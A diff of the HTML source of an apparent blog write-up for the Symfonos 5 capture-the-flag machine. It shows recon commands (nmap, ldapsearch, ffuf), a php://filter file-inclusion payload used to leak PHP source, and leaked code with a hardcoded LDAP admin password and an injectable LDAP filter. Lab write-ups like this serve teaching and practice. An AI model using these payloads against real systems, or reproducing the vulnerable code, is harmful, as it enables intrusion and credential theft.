@@ -23,38 +23,39 @@ password that we could use to ssh into the machine. For privilege escalation to 
 dpkg.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.132
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.0019s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
-389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
-636/tcp open ldapssl?
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.132
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.0019s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>636/tcp open ldapssl?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="389636-ldap">389,636 (LDAP)&lt;/h2>
 &lt;p>Doing some basic enumeration on ldap without credentials we only get the domain name. We&amp;rsquo;ll probably
 get back to it incase we land on some credentials.&lt;/p>
 &lt;p>&lt;strong>nmap scripts&lt;/strong>:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -p 389,636 --script ldap-* 192.168.191.132
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -p 389,636 --script ldap-* 192.168.191.132
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>&lt;strong>ldapsearch&lt;/strong>:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -w &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ldapsearch -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -w &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h2 id="80-http">80 (HTTP)&lt;/h2>
 &lt;p>Opening the site on the browser, we only get a plain page with an image.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Performing a directory/file bruteforce using ffuf, we discover new files.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style="color:#ae81ff">50&lt;/span> | tee root.ffuf
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style="color:#ae81ff">50&lt;/span> | tee root.ffuf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Accessing /home.php we are redirected to admin.php which has a login form.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
@@ -73,138 +74,157 @@ we can abuse LFI to access other files on disk by directory traversal.&lt;/p>
 files so we can check the source code of the app.&lt;/p>
 &lt;p>Accessing the php files directly just executes them, so we need to use php wrappers.&lt;/p>
 &lt;p>&lt;strong>home.php&lt;/strong>&lt;/p>
-&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-&lt;span style="color:#a6e22e">session_start&lt;/span>();
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#39;loggedin&amp;#39;&lt;/span>])){
-&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Location: admin.php&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>]))
-{
-$r &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>];
-$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file_get_contents&lt;/span>($r);
-}
-&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/ul&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;center&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">if ($result){
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo $result;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} else {
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} ?&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/center&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>admin.php&lt;/strong>&lt;/p>
-&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-&lt;span style="color:#a6e22e">session_start&lt;/span>();
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>){
-&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password) {
-$ldap_ch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_connect&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span>);
-&lt;span style="color:#a6e22e">ldap_set_option&lt;/span>($ldap_ch, &lt;span style="color:#a6e22e">LDAP_OPT_PROTOCOL_VERSION&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$ldap_ch) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-$bind &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_bind&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$bind) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-$filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(&amp;amp;(uid=&lt;/span>&lt;span style="color:#e6db74">$username&lt;/span>&lt;span style="color:#e6db74">)(userPassword=&lt;/span>&lt;span style="color:#e6db74">$password&lt;/span>&lt;span style="color:#e6db74">))&amp;#34;&lt;/span>;
-$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_search&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span>, $filter);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$result) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-$info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_get_entries&lt;/span>($ldap_ch, $result);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>($info) &lt;span style="color:#f92672">||&lt;/span> ($info[&lt;span style="color:#e6db74">&amp;#34;count&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
-}
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>;
-}
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>])){
-$username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]);
-$password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]);
-$bIsAuth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password);
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> $bIsAuth ) {
-$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Invalid login&amp;#34;&lt;/span>;
-} &lt;span style="color:#66d9ef">else&lt;/span> {
-$_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
-&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-}
-&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> Login
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/form&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/div&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
-&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/html&amp;gt;
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From admin.php we get credentials that can be used on ldap.&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#39;loggedin&amp;#39;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Location: admin.php&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>]))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$r &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file_get_contents&lt;/span>($r);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
